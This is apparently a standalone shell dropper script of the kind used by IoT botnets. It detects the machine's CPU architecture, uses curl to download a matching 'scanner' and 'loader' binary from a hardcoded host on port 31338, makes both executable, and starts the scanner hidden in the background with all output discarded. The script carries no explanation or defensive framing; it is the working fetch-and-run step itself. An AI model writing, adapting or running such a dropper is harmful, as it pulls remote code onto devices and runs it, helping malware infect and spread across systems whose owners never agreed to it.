#!/bin/sh

arch=$(uname -m | awk '{print tolower($0)}')
ip="192.168.1.97:31338"

if echo "$arch" | grep -qiE 'x86_64|amd64'; then
    curl "http://$ip/amd64_scanner" -o scanner
elif echo "$arch" | grep -qiE 'i386|386'; then
    curl "http://$ip/386_scanner" -o scanner
elif echo "$arch" | grep -qiE 'armv8|arm64|aarch64'; then
    curl "http://$ip/arm64_scanner" -o scanner
elif echo "$arch" | grep -qiE 'arm'; then
    curl "http://$ip/arm_scanner" -o scanner
elif echo "$arch" | grep -qiE 'mips64le'; then 
    curl "http://$ip/mips64le_scanner" -o scanner
elif echo "$arch" | grep -qiE 'mips64'; then 
    curl "http://$ip/mip64_scanner" -o scanner
elif echo "$arch" | grep -qiE 'mips'; then
    curl "http://$ip/mips_scanner" -o scanner
elif echo "$arch" | grep -qiE 'loong64'; then
    curl "http://$ip/loong64_scanner" -o scanner
elif echo "$arch" | grep -qiE 'ppc64le'; then
    curl "http://$ip/ppc64le_scanner" -o scanner
elif echo "$arch" | grep -qiE 'ppc64'; then
    curl "http://$ip/ppc64_scanner" -o scanner
elif echo "$arch" | grep -qiE 'riscv64'; then
    curl "http://$ip/riscv64_scanner" -o scanner
else
    exit
fi
while [ ! -f scanner ]; do
    sleep 1
done
if echo "$arch" | grep -qiE 'x86_64|amd64'; then
    curl "http://$ip/amd64_loader" -o loader
elif echo "$arch" | grep -qiE 'i386|386'; then
    curl "http://$ip/386_loader" -o loader
elif echo "$arch" | grep -qiE 'armv8|arm64|aarch64'; then
    curl "http://$ip/arm64_loader" -o loader
elif echo "$arch" | grep -qiE 'arm'; then
    curl "http://$ip/arm_loader" -o loader
elif echo "$arch" | grep -qiE 'mips64le'; then 
    curl "http://$ip/mips64le_loader" -o loader
elif echo "$arch" | grep -qiE 'mips64'; then 
    curl "http://$ip/mip64_loader" -o loader
elif echo "$arch" | grep -qiE 'mips'; then
    curl "http://$ip/mips_loader" -o loader
elif echo "$arch" | grep -qiE 'loong64'; then
    curl "http://$ip/loong64_loader" -o loader
elif echo "$arch" | grep -qiE 'ppc64le'; then
    curl "http://$ip/ppc64le_loader" -o loader
elif echo "$arch" | grep -qiE 'ppc64'; then
    curl "http://$ip/ppc64_loader" -o loader
elif echo "$arch" | grep -qiE 'riscv64'; then
    curl "http://$ip/riscv64_loader" -o loader
else
    exit
fi
while [ ! -f scanner ]; do
    sleep 1
done
chmod +x scanner
chmod +x loader
nohup ./scanner > /dev/null 2>&1 &